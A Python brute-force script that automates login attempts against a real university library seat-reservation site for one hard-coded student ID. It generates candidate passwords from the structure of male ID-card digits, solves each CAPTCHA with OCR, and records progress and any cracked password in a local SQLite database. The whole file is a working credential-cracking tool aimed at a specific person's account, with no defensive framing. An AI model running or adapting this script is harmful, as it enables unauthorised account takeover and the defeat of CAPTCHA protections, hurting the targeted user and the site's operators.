# -*- coding: utf-8 -*-
import sqlite3
import sys
import time
from datetime import datetime

import ddddocr
from playwright.sync_api import sync_playwright

# ================= 配置区域 =================
USERNAME = "202331223065"  # 目标学号
DB_FILE = "crack.db"
# ===========================================


def init_db():
    """初始化数据库表结构"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    # 进度表：记录每个用户最后一次尝试失败的密码
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS crack_progress (
        username TEXT PRIMARY KEY,
        last_tried_password TEXT,
        updated_at TIMESTAMP
    )
    """)

    # 结果表：记录破解成功的密码
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS found_passwords (
        username TEXT PRIMARY KEY,
        password TEXT,
        found_at TIMESTAMP
    )
    """)

    conn.commit()
    return conn


def get_resume_password(conn, username):
    """获取上次尝试的密码，用于恢复进度"""
    cursor = conn.cursor()
    cursor.execute(
        "SELECT last_tried_password FROM crack_progress WHERE username = ?", (username,)
    )
    row = cursor.fetchone()
    return row[0] if row else None


def update_progress(conn, username, password):
    """更新进度（记录当前已尝试过的密码）"""
    cursor = conn.cursor()
    cursor.execute(
        """
    INSERT OR REPLACE INTO crack_progress (username, last_tried_password, updated_at)
    VALUES (?, ?, ?)
    """,
        (username, password, datetime.now()),
    )
    conn.commit()


def save_success(conn, username, password):
    """保存破解成功的密码"""
    cursor = conn.cursor()
    cursor.execute(
        """
    INSERT OR REPLACE INTO found_passwords (username, password, found_at)
    VALUES (?, ?, ?)
    """,
        (username, password, datetime.now()),
    )
    conn.commit()


def generate_male_passwords(resume_from=None):
    """
    生成器：生成符合男生身份证后6位规则的字符串
    结构：DD(日) + SSS(顺序码) + C(校验位)

    resume_from: 如果提供，生成器将跳过直到匹配该密码之后的密码
    """
    skipping = True if resume_from else False

    # 遍历日期 01-31
    for day in range(1, 32):
        dd = f"{day:02d}"

        # 遍历顺序码 000-999
        for seq in range(1000):
            # 筛选男生：第17位（顺序码的最后一位）必须是奇数
            if seq % 2 == 0:
                continue

            sss = f"{seq:03d}"

            # 遍历校验位 0-9
            for check in range(10):
                c = str(check)
                password = f"{dd}{sss}{c}"

                if skipping:
                    if password == resume_from:
                        skipping = False
                    continue

                yield password


def run_crack():
    # 优先使用命令行参数作为用户名
    if len(sys.argv) > 1:
        target_username = sys.argv[1]
    else:
        target_username = USERNAME

    print(f"[*] 目标用户: {target_username}")

    # 1. 初始化数据库
    conn = init_db()
    last_tried = get_resume_password(conn, target_username)

    if last_tried:
        print(f"[*] 检测到上次进度，从密码 {last_tried} 之后开始继续...")
    else:
        print("[*] 无历史进度，从头开始...")

    # 2. 初始化密码生成器
    password_gen = generate_male_passwords(resume_from=last_tried)

    # 3. 初始化 OCR
    ocr = ddddocr.DdddOcr(show_ad=False, old=True)

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context()
        page = context.new_page()

        print("正在打开登录页面...")
        page.goto("https://seat.ujn.edu.cn/libseat/#/login")
        page.wait_for_load_state("networkidle")

        # 获取第一个要尝试的密码
        try:
            current_password = next(password_gen)
        except StopIteration:
            print("密码生成器为空或已遍历所有组合。")
            conn.close()
            return

        while True:
            try:
                print(f"[-] 正在尝试密码: {current_password}")

                # 1. 填写账号
                page.fill("input[placeholder='请输入账号']", target_username)
                # 2. 填写密码
                page.fill("input[placeholder='请输入密码']", current_password)

                # 3. 处理验证码
                captcha_elem = page.locator(".captcha-wrap img").first
                if not captcha_elem.count():
                    captcha_elem = page.locator("img[src^='data:image']").first

                # 截图并识别
                try:
                    captcha_bytes = captcha_elem.screenshot(timeout=3000)
                except Exception:
                    print("    截图超时或失败，刷新页面重试...")
                    page.reload()
                    page.wait_for_load_state("networkidle")
                    continue

                code = ocr.classification(captcha_bytes)
                if isinstance(code, dict):
                    code = code.get("text", "")

                print(f"    验证码识别: {code}")
                page.fill("input[placeholder='请输入验证码']", str(code))

                # 4. 点击登录
                login_btn = page.query_selector(
                    "button:has-text('登录')"
                ) or page.query_selector(".login-btn")
                if login_btn:
                    login_btn.click()
                else:
                    print("    未找到登录按钮，刷新重试...")
                    page.reload()
                    continue

                # 5. 结果判断轮询 (3秒内检测)
                result_detected = False
                for _ in range(15):  # 15 * 0.2s = 3s
                    time.sleep(0.2)

                    # === 情况A: 登录成功 ===
                    if "/home" in page.url or page.locator(".user-info").count() > 0:
                        print(f"\n{'=' * 30}")
                        print(f"✅ 登录成功！密码是: {current_password}")
                        print(f"{'=' * 30}\n")

                        # 保存结果到数据库
                        save_success(conn, target_username, current_password)
                        print(f"已保存结果到数据库 {DB_FILE}")
                        conn.close()
                        return  # 结束程序

                    # === 情况B: 错误提示 ===
                    error_elem = page.locator(
                        ".el-message__content, .el-message--error"
                    ).first
                    if error_elem.count() > 0 and error_elem.is_visible():
                        err_text = error_elem.inner_text()
                        print(f"    ❌ 提示: {err_text}")
                        result_detected = True

                        if "验证码" in err_text:
                            # 验证码错误：不更新进度，刷新验证码，重试当前密码
                            print("    -> 验证码错误，保持当前密码重试...")
                            captcha_elem.click()
                            time.sleep(1)
                            break  # 跳出轮询，进入下一次 while循环（current_password 不变）

                        elif "密码" in err_text or "账号" in err_text:
                            # 密码错误：更新进度，获取下一个密码
                            print("    -> 密码错误，尝试下一个...")

                            # 记录此密码已试错
                            update_progress(conn, target_username, current_password)

                            try:
                                current_password = next(password_gen)
                            except StopIteration:
                                print("所有密码组合已遍历完毕。")
                                conn.close()
                                return

                            # 刷新验证码，准备下一次
                            captcha_elem.click()
                            time.sleep(0.5)
                            break  # 跳出轮询，进入下一次 while循环

                        elif "锁定" in err_text:
                            print("🚨 账号已被锁定，程序停止。")
                            conn.close()
                            return

                        else:
                            # 未知错误：记录进度，尝试下一个，防止死循环
                            print("    -> 未知错误，尝试下一个...")
                            update_progress(conn, target_username, current_password)
                            try:
                                current_password = next(password_gen)
                            except StopIteration:
                                conn.close()
                                return
                            captcha_elem.click()
                            break

                # 如果轮询结束还没检测到结果
                if not result_detected:
                    print("    ⚠️ 未检测到明确结果（可能响应慢），重试当前密码...")
                    page.reload()
                    page.wait_for_load_state("networkidle")

            except Exception as e:
                print(f"发生异常: {e}")
                try:
                    page.reload()
                    page.wait_for_load_state("networkidle")
                except:
                    pass

        conn.close()
        browser.close()


if __name__ == "__main__":
    run_crack()
